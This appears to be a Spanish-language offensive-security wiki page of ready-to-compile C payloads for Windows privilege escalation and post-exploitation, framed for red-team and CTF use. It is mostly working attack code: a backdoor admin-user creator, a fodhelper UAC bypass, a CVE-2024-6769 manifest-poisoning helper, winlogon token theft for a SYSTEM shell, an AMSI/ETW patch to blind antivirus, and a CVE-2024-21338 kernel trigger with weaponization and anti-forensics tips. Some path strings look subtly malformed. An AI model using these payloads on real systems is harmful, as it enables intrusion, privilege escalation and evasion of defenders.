# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Esta página recopila **pequeños fragmentos en C, autocontenidos** que son útiles durante Windows Local Privilege Escalation o post-exploitation. Cada payload está diseñado para ser **fácil de copiar y pegar**, requiere únicamente la Windows API / tiempo de ejecución de C, y puede compilarse con `i686-w64-mingw32-gcc` (x86) o `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Estos payloads asumen que el proceso ya tiene los privilegios mínimos necesarios para realizar la acción (p. ej., `SeDebugPrivilege`, `SeImpersonatePrivilege`, o un contexto de integridad media para un UAC bypass). Están destinados a entornos **red-team o CTF** donde explotar una vulnerabilidad ha permitido la ejecución arbitraria de código nativo.

---

## Agregar usuario administrador local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Cuando se ejecuta el binario de confianza **`fodhelper.exe`**, consulta la ruta del registro que aparece a continuación **sin filtrar el verbo `DelegateExecute`**. Al plantar nuestro comando bajo esa clave, un atacante puede bypass UAC *sin* dejar un archivo en disco.

*Ruta del registro consultada por `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Un PoC mínimo que abre un `cmd.exe` elevado:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Probado en Windows 10 22H2 y Windows 11 23H2 (parches de julio de 2025). El bypass sigue funcionando porque Microsoft no ha corregido la falta de verificación de integridad en la ruta `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning sigue funcionando contra compilaciones parcheadas de Windows 10/11 porque `ctfmon.exe` se ejecuta como un proceso de UI de alta integridad y confianza que carga sin problemas desde la unidad `C:` suplantada del llamador y reutiliza las redirecciones de DLL que `CSRSS` tenga en caché. El abuso funciona así: redirigir `C:` hacia un almacenamiento controlado por el atacante, colocar un `msctf.dll` troyanizado, ejecutar `ctfmon.exe` para obtener alta integridad, y luego pedir a `CSRSS` que almacene en caché un manifiesto que redirija una DLL usada por un binario auto-elevado (p. ej., `fodhelper.exe`) para que el siguiente lanzamiento herede tu payload sin mostrar un aviso UAC.

Flujo de trabajo práctico:
1. Prepara un árbol falso de `%SystemRoot%\System32` y copia el binario legítimo que planeas secuestrar (a menudo `ctfmon.exe`).
2. Usa `DefineDosDevice(DDD_RAW_TARGET_PATH)` para volver a mapear `C:` dentro de tu proceso, manteniendo `DDD_NO_BROADCAST_SYSTEM` para que el cambio permanezca local.
3. Deposita tu DLL + manifiesto en el árbol falso, llama a `CreateActCtx/ActivateActCtx` para introducir el manifiesto en la caché de activation-context, luego lanza el binario auto-elevado para que resuelva la DLL redirigida directamente hacia tu shellcode.
4. Elimina la entrada de caché (`sxstrace ClearCache`) o reinicia al terminar para borrar huellas del atacante.

<details>
<summary>C - Unidad falsa + ayudante para envenenamiento de manifiesto (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Consejo de limpieza: después de popping SYSTEM, ejecuta `sxstrace Trace -logfile %TEMP%\sxstrace.etl` seguido de `sxstrace Parse` al probar—si ves el nombre de tu manifest en el log, los defensores también pueden verlo, así que rota las rutas en cada ejecución.

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Si el proceso actual posee **ambos** privilegios `SeDebug` y `SeImpersonate` (típico en muchas cuentas de servicio), puedes robar el token de `winlogon.exe`, duplicarlo e iniciar un proceso elevado:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Para una explicación más profunda de cómo funciona eso, vea:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
La mayoría de los motores AV/EDR modernos dependen de **AMSI** y **ETW** para inspeccionar comportamientos maliciosos.  Parchear ambas interfaces tempranamente dentro del proceso actual evita que los payloads basados en scripts (p. ej., PowerShell, JScript) sean escaneados.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*El parche anterior es local al proceso; iniciar un nuevo PowerShell después de ejecutarlo se ejecutará sin inspección de AMSI/ETW.*

---

## Crear proceso hijo como Protected Process Light (PPL)
Solicita un nivel de protección PPL para un hijo en tiempo de creación usando `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Esta es una API documentada y solo tendrá éxito si la imagen objetivo está firmada para la clase de firmante solicitada (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Niveles usados con más frecuencia:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Valida el resultado con Process Explorer/Process Hacker comprobando la columna Protection.

---

## Local Service -> Kernel a través de `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` expone un objeto de dispositivo (`\\.\\AppID`) cuyo IOCTL de mantenimiento del smart-hash acepta punteros a funciones suministrados por el usuario siempre que el llamador se ejecute como `LOCAL SERVICE`; Lazarus está abusando de esto para deshabilitar PPL y cargar drivers arbitrarios, por lo que los red teams deberían tener un trigger listo para uso en laboratorio.

Notas operativas:
- Aún necesitas un token de `LOCAL SERVICE`. Róbalo de `Schedule` o `WdiServiceHost` usando `SeImpersonatePrivilege`, luego impersona antes de tocar el dispositivo para que las comprobaciones de ACL pasen.
- IOCTL `0x22A018` espera una struct que contiene dos punteros de callback (query length + read function). Apunta ambos a stubs en user-mode que construyan un token overwrite o mapeen primitivas ring-0, pero mantiene los buffers RWX para que KernelPatchGuard no falle a mitad de la cadena.
- Tras el éxito, sal de la impersonation y revierte el handle del dispositivo; los defensores ahora buscan handles inesperados `Device\\AppID`, así que ciérralo inmediatamente una vez que se obtenga el privilegio.

<details>
<summary>C - Esqueleto de trigger para el abuso del smart-hash de `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Corrección mínima para una weaponized build: mapea una sección RWX con `VirtualAlloc`, copia ahí tu token duplication stub, establece `KernelThunk = section`, y una vez que `DeviceIoControl` devuelva deberías ser SYSTEM incluso bajo PPL.

---

## Referencias
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – lanzador de procesos PPL mínimo: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
